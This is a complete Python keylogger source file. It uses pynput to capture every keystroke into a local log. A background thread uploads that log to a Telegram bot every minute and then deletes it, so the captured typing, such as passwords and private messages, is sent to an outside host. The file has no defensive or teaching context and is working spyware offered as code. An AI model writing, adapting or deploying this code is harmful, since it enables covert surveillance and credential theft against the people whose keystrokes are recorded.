from pynput import keyboard
import time
import requests
import threading
import os
from dotenv import load_dotenv

load_dotenv()
LOG_FILE = "logger.txt"
BOT_TOKEN=os.getenv("BOT_TOKEN")
CHAT_ID=os.getenv("CHAT_ID")


def send_to_telegram(file_path):
    with open(file_path, 'rb') as f:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",data={"chat_id": CHAT_ID},files={"document": f})
        
def schedule_log_send():
    while True:
        time.sleep(60)  # Wait for 24 hours 86400
        if os.path.exists(LOG_FILE):
            send_to_telegram(LOG_FILE)
            os.remove(LOG_FILE)
            
threading.Thread(target=schedule_log_send, daemon=True).start()


def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(LOG_FILE, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write("[BACKSPACE]")
            else:
                pass
            
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
